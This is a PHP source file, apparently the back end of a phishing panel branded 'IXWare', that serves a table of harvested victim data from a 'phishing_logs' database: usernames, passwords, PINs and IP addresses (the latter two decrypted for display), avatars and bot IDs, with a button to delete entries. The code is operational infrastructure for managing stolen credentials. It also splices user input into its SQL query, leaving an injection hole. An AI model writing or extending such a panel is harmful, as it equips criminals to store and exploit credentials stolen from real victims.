<?php
    @session_start();
    include_once '../includes/functions.php';
    include_once '../includes/checks.php';
     
    header('Content-type: application/json; charset=UTF-8');

    if(isset($_SESSION['ID'])){

      $query = '';
      $query .= "SELECT * FROM `phishing_logs` WHERE `id`=? ";
      if(!empty($_POST["search"]["value"])){
        $query .= 'AND(`avatar` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `username` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `password` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `realacc` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `type` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `pin` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `ip` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `date` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%")';
      }
      if(isset($_POST["order"])){
        $column = htmlspecialchars($_POST['order']['0']['column']);
        if($column == 0){
          $query .= ' ORDER BY `avatar` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 1){
          $query .= ' ORDER BY `username` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 2){
          $query .= ' ORDER BY `password` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 3){
          $query .= ' ORDER BY `realacc` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 4){
          $query .= ' ORDER BY `type` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 5){
          $query .= ' ORDER BY `pin`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 6){
          $query .= ' ORDER BY `ip` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 7){
          $query .= ' ORDER BY `date` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }
      }
      else{
        $query .= ' ORDER BY `date` DESC ';
      }
      if($_POST["length"] != -1){
        $query .= 'LIMIT ' . htmlspecialchars($_POST['start']) . ', ' . htmlspecialchars($_POST['length']);
      }
      //echo $query;
      $stmt = $db->prepare($query);
      $stmt->execute([htmlspecialchars($_SESSION['ID'])]); 
      $results = $stmt->fetchAll();
      $row = $stmt->rowCount();
      
      $nRows = htmlspecialchars(pdoQuery($db, "SELECT COUNT(*) FROM `phishing_logs` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn());
  
      $data = array();
      foreach($results as $result){
          $img = htmlspecialchars($result['avatar']);
          $username = htmlspecialchars($result['username']);
          $password = htmlspecialchars($result['password']);
          $botid = htmlspecialchars($result['botID']);

          $data[] = array(
              "Avatar" => "<img src='$img' alt='IXWare Picture' style='height:150px'></img>",
              "Username" => htmlspecialchars($result['username']),
              "Password" => htmlspecialchars($result['password']),
              "Real Account" => htmlspecialchars($result['realacc']),
              "Type" => htmlspecialchars($result['type']),
              "Pin" => htmlspecialchars(decrypt($result['pin'])),
              "IP" => htmlspecialchars(decrypt($result['ip'])),
              "Date" => htmlspecialchars($result['date']),
              "Actions" => "<form method='POST'>
              <td scope=\"row\" style='word-break:break-all;'>
                <div class='btn-group-vertical' role='group' aria-label='Vertical button group'>
                  <button type='submit' name='removeBot' value='bot' class='btn btn-outline-danger btn-sm bot-action-button bot-delete-button' data-ripple-color='dark'><i class='fas fa-trash-alt mr-2'></i>Delete</button>
                </div>
              </td>
              <input type=\"hidden\" name=\"botID\" value=\"$botid\" />
              </form>"
           );
      }
  
      $draw = htmlspecialchars($_POST['draw']);
      ## Response
      $response = array(
          "draw" => intval($draw),
          "recordsTotal" => $row,
          "recordsFiltered" => $nRows,
          "data" => $data
      );
  
      echo json_encode($response);
    }else{
      echo "Hi";
    }
?>